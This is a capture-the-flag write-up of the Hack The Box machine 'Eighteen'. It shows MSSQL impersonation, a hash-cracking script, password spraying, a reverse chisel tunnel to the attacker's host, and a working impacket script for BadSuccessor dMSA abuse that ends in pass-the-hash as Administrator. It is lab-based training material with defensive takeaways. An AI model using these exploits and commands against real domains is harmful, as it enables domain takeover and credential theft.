# Eighteen: Hack The Box Writeup

**Machine:** Eighteen  
**OS:** Windows  
**Difficulty:** Easy  
**Status:** Retired  
**Date Completed:** April 2026  

---

## Summary

Eighteen is a Windows Active Directory machine running a financial planning web application backed by MSSQL. The attack chain starts with MSSQL access using provided credentials, followed by login impersonation to access a restricted database and extract a password hash. After cracking the hash and password-spraying domain users over WinRM, a foothold is established as `adam.scott`. Privilege escalation exploits **BadSuccessor** (CVE-2025 dMSA abuse): a 2025 vulnerability in Windows Server 2025 allowing any user with `CreateChild` rights on an OU to create a delegated Managed Service Account (dMSA) that inherits the Kerberos keys of any target account, including Domain Admin.

**Key techniques:** MSSQL login impersonation · Database credential extraction · PBKDF2-SHA256 hash cracking · RID brute-forcing · Password spraying · BadSuccessor dMSA abuse · SOCKS tunneling (chisel) · Pass-the-Hash

---

## Reconnaissance

Full port scan:

```bash
sudo nmap -sV -sC -p- -T4 10.129.32.227
```

**Results:**

```
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0: redirects to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: eighteen.htb
|   DNS_Computer_Name: DC01.eighteen.htb
5985/tcp open  http     Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Three services: a web app, MSSQL, and WinRM. The NTLM info from Nmap reveals this is a Domain Controller (`DC01.eighteen.htb`). Add it to hosts:

```bash
sudo sh -c "echo '10.129.32.227 eighteen.htb DC01.eighteen.htb' >> /etc/hosts"
```

---

## Web Application

<img width="1838" height="874" alt="Screenshot 2026-04-18 121458" src="https://github.com/user-attachments/assets/ba192daf-cf99-4d36-9a76-d99c4fb8ba09" />

Navigating to `http://eighteen.htb` shows a financial planning platform. There are `/login` and `/register` endpoints. Registering an account and logging in with it, or attempting common credentials: yields nothing of interest. The provided credentials `kevin / iNa2we6haRj2gaw!` do not work on the web login either.

The real entry point is MSSQL.

---

## MSSQL: Login Impersonation and Hash Extraction

Connect to MSSQL with the provided credentials:

```bash
mssqlclient.py kevin:'iNa2we6haRj2gaw!'@10.129.32.227
```

Kevin logs in as a guest:

```
SQL (kevin  guest@master)>
```

Enumerate databases and impersonation rights:

```
SQL (kevin  guest@master)> enum_db
financial_planner

SQL (kevin  guest@master)> enum_impersonate
execute as   grantee   grantor
----------   -------   -------
LOGIN        kevin     appdev
```

Kevin can impersonate `appdev`. Switching to that login and querying the financial planner database:

```
SQL (kevin  guest@master)> execute as login = 'appdev'
SQL (appdev  appdev@master)> use financial_planner
SQL (appdev  appdev@financial_planner)> select * from users
```

```
id    username   email                password_hash                                                            is_admin
----  ---------  -------------------  -----------------------------------------------------------------------  --------
1002  admin      admin@eighteen.htb   pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90...                        1
```

The hash is Flask's PBKDF2-SHA256 format with 600,000 iterations.

---

## Hash Cracking: PBKDF2-SHA256

The hash format (`pbkdf2:sha256:600000$salt$hex_digest`) requires conversion before cracking. The hex digest needs to be converted to base64 for hashcat mode 10000:

```bash
echo -n "0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133" | xxd -r -p | base64 -w0
# BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

The correctly formatted hash for hashcat:

```
pbkdf2_sha256$600000$AMtzteQIG7yAbZIa$BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
```

600,000 PBKDF2 iterations are too slow for hashcat in a VM. A Python script using the built-in `hashlib` is faster to set up:

```python
#!/usr/bin/env python3
import hashlib, base64, sys

salt = "AMtzteQIG7yAbZIa"
stored_hash = "BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM="
iterations = 600000
stored_bytes = base64.b64decode(stored_hash)

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for i, line in enumerate(f):
        password = line.strip()
        candidate = hashlib.pbkdf2_hmac("sha256", password.encode(), salt.encode(), iterations)
        if candidate == stored_bytes:
            print(f"[+] Password found: {password}")
            sys.exit(0)
        if i % 10000 == 0:
            print(f"[*] Tried {i}...", end="\r")
```

```
[+] Password found: iloveyou1
```
User "admin" and password "iloveyou1" allow login as administrator on the web, however, this is a dead end.

<img width="1833" height="902" alt="Screenshot 2026-04-18 121711" src="https://github.com/user-attachments/assets/7f9d169f-f6cc-4598-a074-9a6bb803f6c0" />

---

## Initial Access: Password Spray via WinRM

With `iloveyou1` in hand, enumerate domain users via RID brute-force through MSSQL:

```bash
nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth
```

Domain users discovered:
```
EIGHTEEN\jamie.dunn
EIGHTEEN\jane.smith
EIGHTEEN\alice.jones
EIGHTEEN\adam.scott
EIGHTEEN\bob.brown
EIGHTEEN\carol.white
EIGHTEEN\dave.green
```

Spray `iloveyou1` against all users over WinRM:

```bash
nxc winrm eighteen.htb -u users.txt -p 'iloveyou1'
```

```
WINRM  DC01  [+] EIGHTEEN\adam.scott:iloveyou1 (Pwn3d!)
```

```bash
evil-winrm -i 10.129.32.227 -u adam.scott -p 'iloveyou1'
```

```
*Evil-WinRM* PS C:\Users\adam.scott\Desktop> type user.txt
# 96010109c3c0f0acb66dda8dc868a953
```

---

## Privilege Escalation: BadSuccessor (dMSA Abuse)

### Enumeration

`adam.scott` is a member of the `IT` group. Checking group memberships and privileges reveals no obvious path via sudo, SPNs, or token abuse.

Running the nxc BadSuccessor detection module (requires proxychains: see Tunneling below):

```bash
proxychains nxc ldap 10.129.32.227 -u adam.scott -p 'iloveyou1' -M badsuccessor
```

```
BADSUCCE... DC01  [+] Found domain controller with operating system Windows Server 2025
BADSUCCE... DC01  IT (S-1-5-21-...-1604), OU=Staff,DC=eighteen,DC=htb
```

The IT group has `CreateChild` rights on `OU=Staff`. This is the BadSuccessor primitive.

### What is BadSuccessor?

Windows Server 2025 introduced **delegated Managed Service Accounts (dMSAs)**. A dMSA can be configured to "succeed" (replace) another account via the `msDS-ManagedAccountPrecededByLink` attribute. When this is set, the DC treats the dMSA as a successor and includes the target account's Kerberos keys in the dMSA's managed password.

The vulnerability: **any user with `CreateChild` rights on an OU can create a dMSA and set it to succeed any account: including Domain Admin**. The DC then issues a ticket using the target's keys, effectively giving the attacker Domain Admin privileges.

### Tunneling: Why chisel is needed

The DC enforces LDAP signing (`signing:Enforced`), which causes direct impacket LDAP connections to fail with `strongerAuthRequired`. Routing traffic through a SOCKS tunnel via chisel allows tools like nxc (which implements LDAP signing) to function correctly.

**On Kali:**
```bash
chisel server -p 8001 --reverse --socks5
```

**On the target (evil-winrm):**
```powershell
# Upload chisel to the target
.\chisel.exe client 10.10.15.200:8001 R:socks
```

**proxychains4.conf:**
```
[ProxyList]
socks5 127.0.0.1 1080
```

**Update /etc/hosts to route eighteen.htb through the tunnel:**
```
127.0.0.1 eighteen.htb
```

### Exploitation

The impacket `badsuccessor.py` script also fails due to LDAP signing. Instead, use impacket's `LDAPConnection` directly: it handles signing natively. The key is building the dMSA with `msDS-GroupMSAMembership` set at creation time (modifying it afterward is not permitted):

```python
#!/usr/bin/env python3
import random, string
from impacket.ldap import ldap, ldaptypes

DC_IP = "10.129.32.227"
DOMAIN = "eighteen.htb"
USERNAME = "adam.scott"
PASSWORD = "iloveyou1"
TARGET_OU = "OU=Staff,DC=eighteen,DC=htb"
TARGET_ACCOUNT = "CN=Administrator,CN=Users,DC=eighteen,DC=htb"
ADAM_SID = "S-1-5-21-1152179935-589108180-1989892463-1609"

def build_security_descriptor(sid_string):
    sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
    sd['Revision'] = b'\x01'
    sd['Sbz1'] = b'\x00'
    sd['Control'] = 32772
    sd['OwnerSid'] = ldaptypes.LDAP_SID()
    sd['OwnerSid'].fromCanonical(sid_string)
    sd['GroupSid'] = b''
    sd['Sacl'] = b''
    acl = ldaptypes.ACL()
    acl['AclRevision'] = 4
    acl['Sbz1'] = 0
    acl['Sbz2'] = 0
    acl.aces = []
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = 0x000F01FF
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid_string)
    nace['Ace'] = acedata
    acl.aces.append(nace)
    sd['Dacl'] = acl
    return sd.getData()

dmsa_name = "dMSA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
dmsa_dn = f"CN={dmsa_name},{TARGET_OU}"

conn = ldap.LDAPConnection(f"ldap://{DC_IP}")
conn.login(USERNAME, PASSWORD, DOMAIN)
print(f"[+] Connected: creating dMSA: {dmsa_name}")

sd_bytes = build_security_descriptor(ADAM_SID)

result = conn.add(dmsa_dn, ["msDS-DelegatedManagedServiceAccount"], {
    "cn": dmsa_name,
    "sAMAccountName": dmsa_name + "$",
    "dNSHostName": f"{dmsa_name.lower()}.{DOMAIN}",
    "userAccountControl": 4096,
    "msDS-ManagedPasswordInterval": 30,
    "msDS-DelegatedMSAState": 2,
    "msDS-ManagedAccountPrecededByLink": TARGET_ACCOUNT,
    "msDS-GroupMSAMembership": sd_bytes,
})
print(f"[+] dMSA created: {result}")
```

```bash
proxychains python3 dmsa_exploit.py
# [+] dMSA created: True
```

### Retrieving the Administrator Hash

Kerberos requires clock synchronisation. Sync first:

```bash 
sudo date -s "$(curl -Iv http://10.129.32.227 2>/dev/null | grep Date | sed 's/Date: //g')"
# Repeat whenever the output is "Clock skew too great", then immediately run the next command
```

Get a TGT for adam.scott:

```bash
proxychains getTGT.py eighteen.htb/adam.scott:'iloveyou1' -dc-ip 10.129.32.227
export KRB5CCNAME=adam.scott.ccache
```

Request a service ticket impersonating the dMSA: the DC returns the managed password keys, which are derived from Administrator's credentials:

```bash
proxychains getST.py -spn 'cifs/DC01.eighteen.htb' -impersonate 'dMSA-UYAH1F$' \
  -dmsa -k -no-pass -force-forwardable eighteen.htb/adam.scott -dc-ip 10.129.32.227
```

```
[*] Current keys:
[*] EncryptionTypes.rc4_hmac: 855db2b899a0326284834e7cd6eb7d56
[*] Previous keys:
[*] EncryptionTypes.rc4_hmac: 0b133be956bfaddf9cea56701affddec
```

These are the Administrator's RC4 NTLM hashes inherited through the dMSA succession chain. Pass-the-Hash directly:

```bash
evil-winrm -i 10.129.32.227 -u Administrator -H '0b133be956bfaddf9cea56701affddec'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
# b37ba8345e2cd2c8d53df8be95c4c594
```
---

<img width="1192" height="682" alt="Screenshot 2026-04-23 122251" src="https://github.com/user-attachments/assets/b79c9218-cf25-459f-a93b-1221af0041f7" />

---

## Vulnerability Summary

| Vulnerability | Location | Impact |
|---------------|----------|--------|
| MSSQL login impersonation | `kevin` → `appdev` | Access to restricted databases |
| Cleartext-equivalent credential in DB | `financial_planner.users` | PBKDF2 hash crackable offline |
| Password reuse | Web app hash → WinRM | Domain foothold as `adam.scott` |
| BadSuccessor (dMSA abuse) | IT group CreateChild on OU=Staff | Full Domain Admin via key inheritance |

---

## Key Takeaways

- **MSSQL impersonation is a first-class pivot**: always run `enum_impersonate` immediately after connecting; a guest login impersonating a more privileged login is a common and powerful escalation
- **PBKDF2 is not immune to offline cracking**: high iteration counts slow things down but common passwords still fall to CPU-based cracking scripts; bcrypt or Argon2 are preferable for sensitive credentials
- **RID brute-forcing via MSSQL is a reliable recon path**: when you have MSSQL access and LDAP is firewalled or signing-enforced, the MSSQL→NTLM auth path can still enumerate domain objects
- **BadSuccessor is a critical Windows Server 2025 vulnerability**: any user with `CreateChild` on an OU can own the domain; organisations running Server 2025 should audit OU-level ACLs immediately and apply patches when available
- **LDAP signing enforcement is a meaningful defence**: it broke most tooling and forced a tunneled approach; enforcing it is good practice on DCs
- **Clock skew is a constant Kerberos headache**: always sync before Kerberos operations; build a reliable one-liner for it

---

*Part of my HTB writeup series: [back to portfolio](https://github.com/Egio7)*
